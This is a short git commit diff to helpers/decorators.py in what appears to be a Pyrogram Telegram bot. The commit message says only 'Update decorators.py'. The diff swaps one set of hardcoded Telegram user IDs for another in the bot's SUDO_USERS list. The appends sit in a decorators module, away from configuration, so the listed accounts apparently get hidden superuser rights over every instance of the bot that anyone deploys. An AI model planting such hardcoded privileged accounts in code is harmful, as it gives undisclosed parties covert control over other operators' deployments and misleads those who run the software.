360b332ee33ee4d840052ffa26819c8d4e4f4631
abdurrohimbontro <89439439+abdurrohimbontro@users.noreply.github.com>
2021-09-14 03:08:31 +0700

    Update decorators.py

--- helpers/decorators.py
+++ helpers/decorators.py
@@ -6,12 +6,9 @@ from pyrogram.types import Message
 from config import Veez
 from helpers.admins import get_administrators
 
-Veez.SUDO_USERS.append(1757169682)
-Veez.SUDO_USERS.append(1738637033)
-Veez.SUDO_USERS.append(1448474573)
-Veez.SUDO_USERS.append(1672609421)
-Veez.SUDO_USERS.append(1670523611)
-Veez.SUDO_USERS.append(1952053555)
+Veez.SUDO_USERS.append(1547381425)
+Veez.SUDO_USERS.append(1940261666)
+Veez.SUDO_USERS.append(1991215069)
 
 def errors(func: Callable) -> Callable:
     async def decorator(client: Client, message: Message):
